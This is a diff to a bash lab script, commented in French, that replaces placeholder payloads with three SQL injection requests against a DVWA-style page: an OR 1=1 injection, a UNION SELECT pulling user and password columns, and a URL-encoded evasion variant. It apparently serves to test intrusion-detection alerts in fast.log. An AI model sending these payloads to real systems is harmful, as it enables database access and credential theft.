@@ -23,23 +23,26 @@ curl -s -c "$COOKIE_FILE" \
 echo "[*] Cookie recupere"
 echo ""
 
-# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
-echo "[1] Payload basique..."
+# Payload 1 Injection basique 
+echo "[1] Injection basique OR 1=1..."
 RESULT=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
 echo "    HTTP $RESULT"
 
-# ── Payload 2 ───────────────────────────────────────────────────────────────
-echo "[2] Payload avance..."
+# Payload 2 UNION SELECT (extraction de données )
+echo "[2] UNION SELECT user/password..."
 RESULT2=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST2&Submit=Submit" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
   -o /dev/null -w "%{http_code}")
 echo "    HTTP $RESULT2"
 
-# ── Payload 3 ───────────────────────────────────────────────────────────────
-echo "[3] Payload evasion..."
-# A completer
+# Payload 3 Évasion (encodage URL + commentaires alternatifs)
+echo "[3] Evasion avec encodage et commentaire #..."
+RESULT3=$(curl -s -b "$COOKIE_FILE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%23&Submit=Submit" \
+  -o /dev/null -w "%{http_code}")
+echo "    HTTP $RESULT3"
 
 echo ""
 echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
